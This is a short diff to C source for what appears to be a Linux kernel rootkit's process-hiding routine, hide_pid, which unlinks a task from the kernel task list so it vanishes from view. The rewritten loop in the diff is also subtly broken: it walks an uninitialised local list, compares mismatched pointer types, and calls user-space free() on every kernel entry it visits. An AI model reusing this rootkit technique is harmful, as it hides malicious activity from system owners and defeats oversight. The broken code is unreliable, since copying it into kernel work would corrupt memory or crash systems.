@@ -2,7 +2,7 @@
 #include <linux/pid.h>
 #include <linux/sched.h>
 #include <linux/proc_fs.h>
-#include <linux/task.h>
+#include <linux/sched/task.h>
 
 #include "hook.h"
 #include "pidhide.h"
@@ -74,12 +74,23 @@ hide_pid(pid_t pid)
     if (!ts)
         return;
 
+    struct task_struct *tmp;
+    struct list_head *pos, *q;
+    struct task_struct mylist;
+
+
+
     rcu_read_lock();
     atomic_dec(&__task_cred(ts)->user->processes);
     rcu_read_unlock();
 
-	write_lock_irq(rwlock);
-    list_del(&ts->tasks);
+    write_lock_irq(rwlock);
+    list_for_each_safe(pos, q, &mylist.tasks){
+        tmp= list_entry(pos, struct task_struct, tasks);
+        if (pos == ts)
+            list_del(pos);
+        free(tmp);
+    }
     write_unlock_irq(rwlock);
 }
 
